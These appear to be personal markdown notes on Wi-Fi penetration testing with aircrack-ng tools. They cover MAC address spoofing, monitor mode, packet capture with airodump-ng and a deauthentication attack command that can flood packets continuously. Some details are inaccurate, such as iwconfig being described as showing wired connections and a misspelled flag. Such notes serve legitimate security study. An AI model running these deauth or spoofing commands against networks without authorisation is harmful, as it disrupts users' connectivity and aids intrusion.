
| Command | Purpose |
| -- | -- |
| `ifconfig` | current network config |
| `iwconfig` | current wired connections |


### Changing mac address
```shell
ifconfig <interface> down;
ifconfig <interface> hw ether <ne:w:v:al:ue>;
ifconfig <interface> up;
```
- reverts back on reboot.

### Setting to monitor mode
```shell
ifconfig <interface> down;
airmon-ng check kill; #not compulsory; killing process that may interfere
iwconfig <interface> mode monitor;
ifconfig <interface> up
```

### Monitoring using `airodump-ng`
>monitor mode should be set

```shell
airodump-ng <interface>
```

Specific band:
```shell
airodump-ng --band <bands> <interface>
```
- check if wireless adapter supports the frequency
- bands:
	- a: 5GHz
	- b,c: 2.4 GHz
	- n: 2.4GHz, 5GHz
	- ac: <6GHz

Specific network:
```shell
airodump-ng --bssid <bssid> --channel <channel> <interface>
```
- 2nd section in output shows the clients

Saving captured data:
```shell
airodump-ng --bssid <bssid> --channell <channel> --write <filename> <interface>
```
- the `filename-01.cap` file can be analysed using wireshark.


### Deauth Attack
```shell
aireplay-ng --deauth <numDeauthPackets> -a <networkMac> -c <targetMac> <interface>
```
- `0` means continuously sending packets
- verify if working on 5Ghz



